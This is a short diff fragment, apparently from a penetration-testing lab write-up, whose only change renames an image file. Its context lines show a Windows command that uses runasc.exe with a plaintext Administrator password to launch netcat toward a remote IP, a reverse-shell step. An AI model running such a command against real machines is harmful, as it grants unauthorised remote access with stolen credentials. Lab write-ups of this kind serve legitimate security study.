@@ -173,4 +173,4 @@ C:\Windows\Tasks>.\runasc.exe Administrator 14WatchD0g$ "C:\Windows\Tasks\nc.exe
 92.168.45.191 21"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (97) (4).png" alt=""><figcaption></figcaption></figure>
